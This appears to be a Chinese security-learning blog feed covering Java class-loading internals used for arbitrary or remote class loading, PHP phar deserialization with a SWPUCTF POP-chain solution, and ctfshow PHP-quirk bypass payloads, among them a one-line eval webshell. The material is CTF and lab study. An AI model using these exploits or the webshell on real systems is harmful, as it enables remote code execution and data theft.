package com.sherlock;public class ClassLoaderTest &#123;    public static void main(String[] args) throws Exception &#123;//        Class.forName(&quot;com.sherlock.Person&quot;);        ClassLoader cl = ClassLoader.getSystemClassLoader();        Class&lt;?&gt; c = Class.forName(&quot;com.sherlock.Person&quot;, false, cl);        c.newInstance();    &#125;&#125;

loadClass类加载过程分析上面有提到一种类加载的方式，通过ClassLoader对象的loadClass()方法来进行类加载，对loadClass()类加载的底层原理进行探寻，看看写在其他地方的类能不能够被加载，从而实现任意类加载，可以做更多的事

让我们来调试一下，跟进loadClass方法（这里需要强制步入），来到了ClassLoader类的loadClass()方法，继续跟进进去

来到了AppClassLoader类下的loadClass()方法，在做了一系列的安全检查之后，走到了调用父类的loadClass()方法，留意到此处有一个findLoadedClass()方法，适用于检测类是否已经被加载过了，该方法在下面的loadClass()方法中被大量调用，
这里暂停一下，详细理解一下loadClass()方法，它的作用就是一层一层地向上委托，检测该类是否已经被加载过（对应下文的findLoadedClass()），如果加载过则直接返回，未加载则委托给父加载器来加载，递归到最顶层的加载器BootStrap ClassLoader之后，若无法加载此类，再一层一层向下委派给子类加载器来加载

最后又回到了重载的loadClass方法（父类的），我们步过跟进一下分析，410行这里显示此时parent还不是null，也就是双亲委派过程中Application ClassLoader还得向上寻找Extension ClassLoader，跟进此处的loadClass()

跟进后还是来到了ClassLoader类的loadClass()方法下，但是此时this已经变成了ExtClassLoader了

parent无法再找到了，直接调bootstrapClassLoader，步入跟进到最后是个native底层方法，直接步过，也是看到c是null，未在\lib下加载出Person类，此时bootstrap类加载器已经无法加载Person类了，需要将其委派给子类加载器来加载了，代码继续向下执行

来到了此处的一个findClass()方法，再对findClass()方法做个详细点的理解，findClass()的主要功能就是找到对应的class文件，然后将class文件读入内存中转换为字节码传递给后面将出现的defineClass()，得到Class对象

我们强制步入看看该函数，我们会发现跑到了URLClassLoader类下的findClass函数。为什么呢
这是因为上面的findClass()稍微跟进一下，是ClassLoader中一个需要被重写的方法，本身都没有做定义，在ExtClassLoader中调用的时候会向父类寻找findClass()，这几个类的继承关系是ClassLoader-&gt;SecureClassLoader-&gt;URLClassLoader-&gt;AppClassLoader&#x2F;ExtClassLoader，因此最终也是调用了URLClassLoader的方法
第一次ExtClassLoader进行findClass未能获取到class文件，继续向下委派（进入这个doPrivileged()方法需要”强制步入”-&gt;”步过”-&gt;”强制步入”-&gt;”步入”）

到AppClassLoader，再次步入findClass()方法，此时能够看到ucp已经从路径中读取到class文件，res将传入下面的defineClass()方法进行类加载，继续跟进

URLClassLoader对defineClass()方法进行了一个重写，前面的大部分代码都是做了一些安全判断，以及从res获取字节等的功能，最重要的在于最后一行中调用的另一个格式重写的defineClass()方法，跟进一下
又来到了URLClassLoader的父类SecureClassLoader，调用其中重写的defineClass()

继续跟进该defineClass()方法，重新回到ClassLoader中，此时各种资源，包括class文件的路径，字节码等均准备就绪，下方调用了一个defineClass1()方法

在类中找到defineClass1()的定义，是一个native方法，无法继续跟进了，实际上最后就是在这个地方完成了类的动态加载，分析一下参数，传入一个类名，一个类文件的字节码，然后从字节码中获取到这个类
获取到class之后，自上向下的委派成功了，因此一步步地返回，返回到findClass处，已经成功获取到一个Class对象了，后续步过至结束，成功完成类加载

总结一下，其实就是
ClassLoader-&gt;SecureClassLoader-&gt;URLClassLoader-&gt;AppClassLoader
loadClass-&gt;findClass(重写的方法)-&gt;defineClass(从字节码加载类)
URLClassLoader动态类加载其实就是可以通过输入一个URL实现类加载
首先我们新建一个类文件，内容如下：
import java.io.IOException;public class Test &#123;    static &#123;        try &#123;            Runtime.getRuntime().exec(&quot;calc&quot;);        &#125; catch (IOException e) &#123;            throw new RuntimeException(e);        &#125;    &#125;&#125;

然后将文件编译后可以在target目录下面找到文件Test.class，将该文件剪贴至我自己创建的目录tmp下面
利用URLClassLoader进行类加载，并实例化后可以弹出计算机
（此处切记传入参数结尾需要是两条反斜杠，否则tmp将不被认为是目录的一部分而是被看做jar包）
但是呢file里面我们是本地调用，一般是没有什么用的，但是呢我们可以用http协议来
在tmp目录下面起一个http服务：python -m http.server 9999
然后通过该url加载该目录下面的Test类，成功弹出计算器

这说明了我们同样可以远程加载类，大大增加了攻击面
defineClass()触发动态类加载留意到defineClass()方法在ClassLoader类中是受保护的方法，因此想调用须通过反射
几个参数，第一个是类名，第二个是字节码，第三个是字节码起始读取位，第四个是读取长度

完整代码如下：
package com.sherlock;import java.lang.reflect.Method;import java.nio.file.Files;import java.nio.file.Paths;public class ClassLoaderTest &#123;    public static void main(String[] args) throws Exception &#123;        ClassLoader cl = ClassLoader.getSystemClassLoader();        Method defineClass = ClassLoader.class.getDeclaredMethod(&quot;defineClass&quot;, String.class, byte[].class, int.class, int.class);        defineClass.setAccessible(true);        byte[] code = Files.readAllBytes(Paths.get(&quot;E:\\mycode\\tmp\\Test.class&quot;));        Class c = (Class)defineClass.invoke(cl, &quot;Test&quot;, code, 0, code.length);        c.newInstance();    &#125;&#125;

我们测试一下，成功弹窗

用另一种defineClass()同样可行（无需类名）
package com.sherlock;import sun.misc.Unsafe;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;public class ClassLoaderTest &#123;    public static void main(String[] args) throws Exception &#123;        ClassLoader cl = ClassLoader.getSystemClassLoader();        Class c = Unsafe.class;        Field theUnsafeField = c.getDeclaredField(&quot;theUnsafe&quot;);        theUnsafeField.setAccessible(true);        Unsafe unsafe = (Unsafe) theUnsafeField.get(null);        byte[] code = Files.readAllBytes(Paths.get(&quot;E:\\mycode\\tmp\\Test.class&quot;));        Class c2 = (Class)unsafe.defineClass(&quot;Test&quot;, code, 0, code.length,cl,null);        c2.newInstance();    &#125;&#125;

相比URLClassLoader：
优点：无需出网
缺点：defineClass是受保护的，反序列化过程中比较少见一个方法中能够直接调用该方法的
Java 主要的类加载器及其继承关系与双亲委派流程，可以直观地理解为：
引用https://blog.potatowo.top/2024/09/19/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD/
]]></content>
      <categories>
        <category>java反序列化</category>
      </categories>
  </entry>
  <entry>
    <title>phar反序列化学习</title>
    <url>/2024/06/11/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[引用PHP反序列化入门之phar
phar反序列化原理及利用
php反序列化拓展攻击详解–phar
phar介绍简单来说phar就是php压缩文档。它可以把多个文件归档到同一个文件中，而且不经过解压就能被 php 访问并执行，与file:// php://等类似，也是一种流包装器。
phar结构由 4 部分组成

stub phar 文件标识，格式为 xxx&lt;?php xxx; __HALT_COMPILER();?&gt;；
manifest 压缩文件的属性等信息，以序列化存储；
contents 压缩文件的内容；
signature 签名，放在文件末尾；

这里有两个关键点，一是文件标识，必须以__HALT_COMPILER();?&gt;结尾，但前面的内容没有限制，也就是说我们可以轻易伪造一个图片文件或者pdf文件来绕过一些上传限制；二是反序列化，phar存储的meta-data信息以序列化方式存储，当文件操作函数通过phar://伪协议解析phar文件时就会将数据反序列化，而这样的文件操作函数有很多
phar文件的生成以及利用在php.ini中配置如下时，才能生成phar文件，记得要删除前面的分号
phar.readonly = Off

下面举得这个例子php版本要在8.0以上（哭死）
正常的php反序列化是通过unserialize函数来实现的，而phar反序列化可以通过 file_get_contents函数来实现，如下：
&lt;?phperror_reporting();class Test &#123;    public $num = 2;    public function __destruct() &#123;        if ($this-&gt;num === 1) &#123;            echo &#x27;flag&#123;^_^&#125;&#x27;;        &#125;    &#125;&#125;echo file_get_contents($_GET[&#x27;file&#x27;]);

构造phar反序列化的代码如下：
&lt;?phpclass Test &#123;    public $num;&#125;$a = new Test();$a-&gt;num=1;$phar = new Phar(&quot;a.phar&quot;); // 创建一个名为 &quot;a.phar&quot; 的 Phar 归档文件。$phar-&gt;startBuffering(); //使用 startBuffering() 方法开始缓冲，以便在添加文件之前可以对 Phar 对象进行配置。$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); /* 设置stub，必须以__HALT_COMPILER(); ?&gt;结尾*/$phar-&gt;setMetaData($a); # 设置自定义的metadata，序列化存储，解析式会被序列化。$phar-&gt;addFromString(&quot;test2.txt&quot;, &quot;test2&quot;); //要压缩的文件,phar文件里面的文件为test2.txt,内容为test2//签名自动计算$phar-&gt;stopBuffering(); 

然后我们可以看到本地的同一个文件夹下面生成了a.phar
然后get传参：?file=phar://a.phar/test2.txt，可以看到如下结果：
可以看见输出了test2和flag，test2为我们的a.phar文件里面的内容，通过file_get_contents函数读取出来的，至于为什么flag也读出来，是因为a.phar里面有我们的恶意代码，phar文件被反序列化了
触发phar反序列化的敏感函数文件相关的函数fileatime / filectime / filemtimestat / fileinode / fileowner / filegroup / filepermsfile / file_get_contents / readfile / fopenfile_exists / is_dir / is_executable / is_file is_link / is_readable / is_writeable / is_writableparse_ini_fileunlinkcopy

其他触发函数image    exif_thumbnail    exif_imagetype    imageloadfont    imagecreatefrom***    getimagesize    getimagesizefromstringhash    hash_hmac_file    hash_file    hash_update_file    md5_file    sha1_filefile / url    get_meta_tags    get_headers

常见的绕过方式绕过phar:&#x2F;&#x2F;开头compress.bzip://phar://a.phar/test1.txtcompress.bzip2://phar://a.phar/test1.txtcompress.zlib://phar://a.phar/test1.txtphp://filter/resource=phar://a.phar/test1.txtphp://filter/read=convert.base64-encode/resource=phar://a.phar/test1.txt

绕过图片检查可以修改phar文件名的后缀文件开头添加GIFB9a绕过十六进制检查
$phar-&gt;setStub(&quot;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&quot;);

利用条件任何漏洞或攻击手法不能实际利用，都是纸上谈兵。在利用之前，先来看一下这种攻击的利用条件。
1.phar文件要能够上传到服务器端。2.如file_exists()，fopen()，file_get_contents()，file()等文件操作的函数要有可用的魔术方法作为”跳板”。3.文件操作函数的参数可控，且::、/、phar等特殊字符没有被过滤。
例题upload_file.php后端检测文件上传，文件类型是否为gif，文件后缀名是否为gif
&lt;?phpif (($_FILES[&quot;file&quot;][&quot;type&quot;]==&quot;image/gif&quot;)&amp;&amp;(substr($_FILES[&quot;file&quot;][&quot;name&quot;], strrpos($_FILES[&quot;file&quot;][&quot;name&quot;], &#x27;.&#x27;)+1))== &#x27;gif&#x27;) &#123;    echo &quot;Upload: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;];    echo &quot;Type: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;];    echo &quot;Temp file: &quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];    if (file_exists(&quot;upload_file/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]))      &#123;      echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; already exists. &quot;;      &#125;    else      &#123;      move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],      &quot;upload_file/&quot; .$_FILES[&quot;file&quot;][&quot;name&quot;]);      echo &quot;Stored in: &quot; . &quot;upload_file/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;];      &#125;    &#125;else  &#123;  echo &quot;Invalid file,you can only upload gif&quot;;  &#125;

upload_file.html
&lt;html&gt;&lt;body&gt;&lt;form action=&quot;http://localhost/upload_file.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;    &lt;input type=&quot;submit&quot; name=&quot;Upload&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;

un.php存在file_exists()，并且存在__destruct()
&lt;?php$filename=@$_GET[&#x27;filename&#x27;];echo &#x27;please input a filename&#x27;.&#x27;&lt;br /&gt;&#x27;;class AnyClass&#123;    var $output = &#x27;echo &quot;ok&quot;;&#x27;;    function __destruct()    &#123;           eval($this -&gt; output);    &#125;&#125;    if(file_exists($filename))&#123;        $a = new AnyClass();    &#125;    else&#123;        echo &#x27;file is not exists&#x27;;    &#125;?&gt;

该环境存在两个点，第一存在文件上传，只能上传gif图，第二存在魔术方法__destruct()以及文件操作函数file_exists()，而且在AnyClass类中调用了eval，以此用来命令执行。我们知道以上条件正好满足利用条件。根据un.php写一个生成phar的php文件，在文件头加上GIF89a绕过gif，然后我们访问这个php文件后，生成了phar.phar，修改后缀为gif，上传到服务器，然后利用file_exists，使用phar:&#x2F;&#x2F;执行代码
poc.php
&lt;?phpclass AnyClass&#123;    var $output = &#x27;&#x27;;&#125;$phar = new Phar(&#x27;phar.phar&#x27;);$phar -&gt; stopBuffering();$phar -&gt; setStub(&#x27;GIF89a&#x27;.&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;);$phar -&gt; addFromString(&#x27;test.txt&#x27;,&#x27;test&#x27;);$object = new AnyClass();$object -&gt; output= &#x27;phpinfo();&#x27;;$phar -&gt; setMetadata($object);$phar -&gt; stopBuffering();

生成phar文件后，改后缀为gif
payload:un.php?filename=phar://phar.gif/test


[SWPUCTF 2018]SimplePHP开启题目环境，进入点击查看文件的时候搜索栏为：http://96147239-9a37-4585-8e45-c7494c8aa92b.node5.buuoj.cn:81/file.php?file=，通过file来读取文件，是个可疑点
查看页面源码，如下：

提示flag在f1ag.php中，尝试直接访问，回显hacker
尝试读取文件：/file.php?file=file.php，代码如下：
&lt;?php header(&quot;content-type:text/html;charset=utf-8&quot;);  include &#x27;function.php&#x27;; include &#x27;class.php&#x27;; ini_set(&#x27;open_basedir&#x27;,&#x27;/var/www/html/&#x27;); $file = $_GET[&quot;file&quot;] ? $_GET[&#x27;file&#x27;] : &quot;&quot;; if(empty($file)) &#123;     echo &quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;; &#125; $show = new Show(); if(file_exists($file)) &#123;     $show-&gt;source = $file;     $show-&gt;_show(); &#125; else if (!empty($file))&#123;     die(&#x27;file doesn\&#x27;t exists.&#x27;); &#125; 

看得出来文件都存在/var/www/html目录下面；另外函数file_exists，感觉可以利用phar反序列化漏洞
查看包含的文件class.php，如下：
&lt;?phpclass C1e4r&#123;    public $test;    public $str;    public function __construct($name)    &#123;        $this-&gt;str = $name;    &#125;    public function __destruct()    &#123;        $this-&gt;test = $this-&gt;str;        echo $this-&gt;test;    &#125;&#125;class Show&#123;    public $source;    public $str;    public function __construct($file)    &#123;        $this-&gt;source = $file;   //$this-&gt;source = phar://phar.jpg        echo $this-&gt;source;    &#125;    public function __toString()    &#123;        $content = $this-&gt;str[&#x27;str&#x27;]-&gt;source;        return $content;    &#125;    public function __set($key,$value)    &#123;        $this-&gt;$key = $value;    &#125;    public function _show()    &#123;        if(preg_match(&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;,$this-&gt;source)) &#123;            die(&#x27;hacker!&#x27;);        &#125; else &#123;            highlight_file($this-&gt;source);        &#125;            &#125;    public function __wakeup()    &#123;        if(preg_match(&quot;/http|https|file:|gopher|dict|\.\./i&quot;, $this-&gt;source)) &#123;            echo &quot;hacker~&quot;;            $this-&gt;source = &quot;index.php&quot;;        &#125;    &#125;&#125;class Test&#123;    public $file;    public $params;    public function __construct()    &#123;        $this-&gt;params = array();    &#125;    public function __get($key)    &#123;        return $this-&gt;get($key);    &#125;    public function get($key)    &#123;        if(isset($this-&gt;params[$key])) &#123;            $value = $this-&gt;params[$key];        &#125; else &#123;            $value = &quot;index.php&quot;;        &#125;        return $this-&gt;file_get($value);    &#125;    public function file_get($value)    &#123;        $text = base64_encode(file_get_contents($value));        return $text;    &#125;&#125;

可以发现文件读取的主要函数是file_get ，我们可以构造它的内容为&#x2F;var&#x2F;www&#x2F;html&#x2F;f1ag.php读取flag
但是要想执行file_get 函数就必须调用get函数，可以看见get方法的调用又来自__get魔术方法，在__get魔术方法中访问一个对象的不可访问属性时被调用，会自动调用
可以知道代码中的类Show中的__toString()方法中的$content = $this-&gt;str[&#39;str&#39;]-&gt;source;，当$this-&gt;str[&#39;str&#39;]=new Test()时，相当于访问它的不存在属性source，会触发__get魔术方法
调用__toString()方法的话必须使用echo打印该对象，而类C1e4r中__destruct()方法便有echo，只要使$this-&gt;source=new Show()便会触发上面所要的方法
综上，pop链的构造思路如下：
Test()-&gt;params[&#x27;source&#x27;]=&quot;/var/www/html/f1ag.php&quot;; //Test类中获取的文件为f1ag.phpShow()-&gt;str[&#x27;str&#x27;] = new Test(); //调用Show类的属性，因为在Test类中不存在该属性，触发__get方法C1e4r()-&gt;str = new Show(); //调用C1e4r类的str属性给Show类

别忘了，file.php文件还包含了function.php文件，访问：/file.php?file=function.php，得到的代码如下：
&lt;?php //show_source(__FILE__); include &quot;base.php&quot;; header(&quot;Content-type: text/html;charset=utf-8&quot;); error_reporting(0); function upload_file_do() &#123;     global $_FILES;     $filename = md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;;     //mkdir(&quot;upload&quot;,0777);     if(file_exists(&quot;upload/&quot; . $filename)) &#123;         unlink($filename);     &#125;     move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot; . $filename);     echo &#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;&#x27;; &#125; function upload_file() &#123;     global $_FILES;     if(upload_file_check()) &#123;         upload_file_do();     &#125; &#125; function upload_file_check() &#123;     global $_FILES;     $allowed_types = array(&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;);     $temp = explode(&quot;.&quot;,$_FILES[&quot;file&quot;][&quot;name&quot;]);     $extension = end($temp);     if(empty($extension)) &#123;         //echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;;     &#125;     else&#123;         if(in_array($extension,$allowed_types)) &#123;             return true;         &#125;         else &#123;             echo &#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;;             return false;         &#125;     &#125; &#125; 

由上可知上传的文件后缀名只允许&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;，并且文件会上传到upload目录下面去
综上，构造的代码如下：
&lt;?phpclass C1e4r&#123;    public $test;    public $str;&#125;class Show&#123;    public $source;    public $str;&#125;class Test&#123;    public $file;    public $params;&#125;$a = new Test();$a-&gt;params[&#x27;source&#x27;] = &quot;/var/www/html/f1ag.php&quot;; //因为source属性是get函数的传参，我们可以利用它自定义读取的文件$b = new Show();$b-&gt;str[&#x27;str&#x27;] = $a; //Show类中的str[&#x27;str&#x27;]给Test类，因为该属性对于Test类不存在，可以调用__get魔术方法$c = new C1e4r();$c-&gt;str = $b;   //C1e4r类将str属性给Show类/*最后打包成phar文件*/$phar = new Phar(&quot;a.gif&quot;); //后缀名改为gif$phar-&gt;startBuffering();$phar -&gt; setStub(&#x27;GIF89a&#x27;.&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;); //绕过图片检查$phar-&gt;setMetaData($c);$phar-&gt;addFromString(&quot;test2.txt&quot;, &quot;test2&quot;);$phar-&gt;stopBuffering();

运行代码后得到我们所要的文件，上传并访问upload目录，如下：
然后访问刚刚上传的文件：/file.php?file=phar://upload/	5d719d2e174b5a883867b802a89db296.jpg

得到一串base64编码的字符串，拿去解码后就可以得到flag啦
题目解决
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>php特性</title>
    <url>/2024/02/27/php%E7%89%B9%E6%80%A7/</url>
    <content><![CDATA[知识1、数组绕过正则表达式if(preg_match(&quot;/[0-9]/&quot;, $num))&#123;        die(&quot;no no no!&quot;);    &#125;else(intval($num))&#123;        echo $flag;    &#125;

preg_match第二个参数要求是字符串，如果传入数组则不会进入if语句
payload:num[]=1
2、intval函数的使用intval( mixed $value, int $base = 10) : int

如果 base 是 0，通过检测 value 的格式来决定使用的进制：◦ 如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则，◦ 如果字符串以 “0” 开始，使用 8 进制(octal)；否则，◦ 将使用 10 进制 (decimal)
if($num===&quot;4476&quot;)&#123;        die(&quot;no no no!&quot;);    &#125;if(intval($num,0)===4476)&#123;        echo $flag;    &#125;else&#123;        echo intval($num,0);    &#125;

科学计数法也可以绕过
intval(&#x27;4476.0&#x27;)===4476    小数点  intval(&#x27;+4476.0&#x27;)===4476   正负号intval(&#x27;4476e0&#x27;)===4476    科学计数法intval(&#x27;0x117c&#x27;)===4476    16进制intval(&#x27;010574&#x27;)===4476    8进制intval(&#x27; 010574&#x27;)===4476   8进制+空格

payload:num=4476.0
3、正则表达式修饰符&amp;web91if(preg_match(&#x27;/^php$/im&#x27;, $a))&#123;    if(preg_match(&#x27;/^php$/i&#x27;, $a))&#123;        echo &#x27;hacker&#x27;;    &#125;    else&#123;        echo $flag;    &#125;&#125;else&#123;    echo &#x27;nonononono&#x27;;&#125;

^匹配字符串的开头，i 不区分(ignore)大小写；$匹配字符串的末尾，m多(more)行匹配，若有换行符则以换行符分割，按行匹配
payload:%0aphp,第一行匹配换行后有php故通过，第二个不符合php开头php结尾故不通过
4、highlight_file路径&amp;web96highlight_file的参数可以是路径的
if($_GET[&#x27;u&#x27;]==&#x27;flag.php&#x27;)&#123;        die(&quot;no no no&quot;);    &#125;else&#123;        highlight_file($_GET[&#x27;u&#x27;]);    &#125;

if语句只比对字符串，highlight_file可以写路径，故payload有多种解法：
/var/www/html/flag.php              绝对路径./flag.php                          相对路径php://filter/resource=flag.php      php伪协议

5、md5比较缺陷PHP中hash比较是存在缺陷的，MD5无法处理数组，如果传入数组则返回NULL，两个NULL是强相等的
if ($_POST[&#x27;a&#x27;] != $_POST[&#x27;b&#x27;])&#123;    if (md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;]))&#123;        echo $flag;    &#125;else&#123;    print &#x27;Wrong.&#x27;;    &#125;&#125;

不同数据强相等
payload:a[]=1&amp;b[]=2
md5弱比较，使用了强制类型转换后不再接收数组
$a=(string)$a;$b=(string)$b;if(  ($a!==$b) &amp;&amp; (md5($a)==md5($b)) )&#123;echo $flag;&#125;

md5弱比较，为0e开头的会被识别为科学记数法，结果均为0，所以只需找两个md5后都为0e开头且0e后面均为数字的值即可。
不同数据弱相等
payload: a=QNKCDZO&amp;b=240610708
MD5等于自身，如md5($a)==$a,php弱比较会把0e开头识别为科学计数法，结果均为0，所以此时需要找到一个MD5加密前后都是0e开头的，如0e215962017
md5强碰撞
$a=(string)$a;$b=(string)$b;if(  ($a!==$b) &amp;&amp; (md5($a)===md5($b)) )&#123;echo $flag;&#125;这时候需要找到两个真正的md5值相同数据a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2

6、三目运算符的理解+变量覆盖&amp;web98&lt;?php    include(&quot;flag.php&quot;);$_GET?$_GET=&amp;$_POST:&#x27;flag&#x27;;$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_COOKIE:&#x27;flag&#x27;;$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_SERVER:&#x27;flag&#x27;;highlight_file($_GET[&#x27;HTTP_FLAG&#x27;]==&#x27;flag&#x27;?$flag:__FILE__);?&gt;

第一行，GET被设置，就可以用POST覆盖GET的值。中间两行意义不大，是flag就被COOKIE覆盖，然后被SERVER覆盖，不是flag被赋值flag然后条件成立也是被SERVER覆盖。而且这个被覆盖的GET没有指定，任意都行，第四行才是关键，等于flag就输出flag，不等于显示源码。所以只需要传入一个任意的GET保证$_GET是被设置的。然后POST一个覆盖它
第一行，使用GET方式接收数据，若是GET传参，则将GET替换成POST 先用GET 往里传东西，随便传 例如： url?1 然后根据最后一行 hackbar通过POST方式往里传HTTP_FLAG&#x3D;flag即可
payload:get：1=1 post：HTTP_FLAG=flag
7、php弱类型比较&amp;web99经典
$allow = array();for ($i=36; $i &lt; 0x36d; $i++) &#123;     array_push($allow, rand(1,$i));&#125;if(isset($_GET[&#x27;n&#x27;]) &amp;&amp; in_array($_GET[&#x27;n&#x27;], $allow))&#123;    file_put_contents($_GET[&#x27;n&#x27;], $_POST[&#x27;content&#x27;]);&#125;

对于代码的解释：

$allow = array();: 创建了一个名为 $allow 的空数组，用于存储允许操作的文件名。
for ($i=36; $i &lt; 0x36d; $i++) &#123; array_push($allow, rand(1,$i)); &#125;: 这是一个 for 循环，从十进制数 36 到十六进制数 0x36d（十进制数为 877）循环遍历，每次循环将一个随机数（范围在 1 到当前循环变量 $i 的值之间）添加到 $allow 数组中。这样做的目的是生成一个随机的允许操作的文件名数组。
if(isset($_GET[&#39;n&#39;]) &amp;&amp; in_array($_GET[&#39;n&#39;], $allow))&#123;: 这行代码首先检查是否设置了 GET 请求参数 &#39;n&#39;，并且检查参数值是否存在于 $allow 数组中。如果这两个条件都满足，则继续执行下面的代码。
file_put_contents($_GET[&#39;n&#39;], $_POST[&#39;content&#39;]);: 这行代码使用 file_put_contents() 函数将 POST 请求参数 &#39;content&#39; 的内容写入到名为 &#39;n&#39; 的文件中。这里的 $_GET[&#39;n&#39;] 是文件名，$_POST[&#39;content&#39;] 是要写入的文件内容。

弱比较字符串1.php与1返回true。array_push这个函数往里填数字1，则是int类型，in_array使用的就是&#x3D;&#x3D;弱比较。所以，如果数组里有数字1，与字符串1.php比较时是返回true的。注意，$array( 1 , ‘2’ , ‘3’ )，这里1是int型，2和3都是string类型。
这道题，每次生成随机数都包含1，所以1在数组中的可能最大。
payload:n=1.php post:content=&lt;?php eval($_POST[1]);?&gt;只要，然后蚁剑直接连
8、and与&amp;&amp;的区别&lt;?php$a=true and false and false;var_dump($a);  返回true$a=true &amp;&amp; false &amp;&amp; false;var_dump($a);  返回false

and运算符优先级低于 =，&amp;&amp;运算符优先级高于 =
9、反射类ReflectionClass&amp;web101反射类还不太懂，但做题都是直接输出这个类echo new ReflectionClass(&#39;类名&#39;);，可以获得类的反射对象（包含元数据信息）。
元数据对象（包含class的所有属性&#x2F;方法的元数据信息）
&lt;?phphighlight_file(__FILE__);include(&quot;ctfshow.php&quot;);//flag in class ctfshow;$ctfshow = new ctfshow();$v1=$_GET[&#x27;v1&#x27;];$v2=$_GET[&#x27;v2&#x27;];$v3=$_GET[&#x27;v3&#x27;];$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);if($v0)&#123;    if(!preg_match(&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\;|\?|[0-9]/&quot;, $v2))&#123;        if(!preg_match(&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\?|[0-9]/&quot;, $v3))&#123;            eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;);        &#125;    &#125;    &#125;?&gt;

payload：?v1=1&amp;v2=echo new Reflectionclass&amp;v3=;
flag中有些字符经过ACSII码变换，好像还少了一位，爆破即可（这步目前还不会操作）
10、is_numeric与hex2bin is_numeric在PHP5中是可以识别十六进制的，hex2bin参数不能带0x
字符串可以被is_numeric()函数解析成数字
11、sha1比较缺陷&amp;web104sha1无法处理数组，如下可使用a[]&#x3D;1&amp;b[]&#x3D;1数组绕过
if($a==$b)&#123;    if(sha1($a)==sha1($b))&#123;        echo $flag;    &#125;&#125;

但MD5或者sha1这种如果强制类型转换后，就不接受数组了，这个时候就要找真正的编码后相同的了，如
aaroZmOkaaK1STfYaaO8zKZFaa3OFF9m

12、PHP双$（$$）的变量覆盖在双写$的时候，属于动态变量，就是后面的变量值作为新的变量名
$test=&quot;a23&quot;;    $test等于a23$$test=456;        $$test也就等于$a23,这里相当于给$a23赋值了echo $test;        正常输出$test为a23echo $$test;    这里输出$$test，就是$a23，为456echo $a23;        第二行给$a23赋值了，这里正常输出

13、parse_str函数的使用parse_str会把字符串解析为变量，大部分是传入的多个值
$a=&quot;q=123&amp;p=456&quot;;parse_str($a);  //没有提供第二个参数（存储解析结果的数组），所以解析后的键值对将会以相应的变量形式存在echo $q;                输出123echo $p;                输出456parse_str($a,$b);        第二个参数作为数组，解析的变量都存入这个数组中echo $b[&#x27;q&#x27;];            输出123echo $b[&#x27;p&#x27;];            输出456

php8版本必须要有第二个参数，php7不影响使用但会警告一下
14、ereg %00正则截断&amp;web108ereg PHP5.3废弃了，功能可以由preg_match代替，ereg有个截断漏洞，字符串里包括%00就只匹配%00之前的内容。所以可以前面根据正则改，后面是执行语句，如果有strrev() 这种字符串反转函数配合用更好。
&lt;?phphighlight_file(__FILE__);error_reporting(0);include(&quot;flag.php&quot;);if (ereg (&quot;^[a-zA-Z]+$&quot;, $_GET[&#x27;c&#x27;])===FALSE)  &#123;    die(&#x27;error&#x27;);&#125;//只有36d的人才能看到flagif(intval(strrev($_GET[&#x27;c&#x27;]))==0x36d)&#123;    echo $flag;&#125;?&gt;

payload：?c=w%00778
15、迭代器获取当前目录(getcwd())&amp;web109&amp;web110FilesystemIterator可以获得文件目录，参数需要 . 或者具体路径，**getcwd()**这个函数可以获取当前文件路径，二者在一定条件下配合使用较好
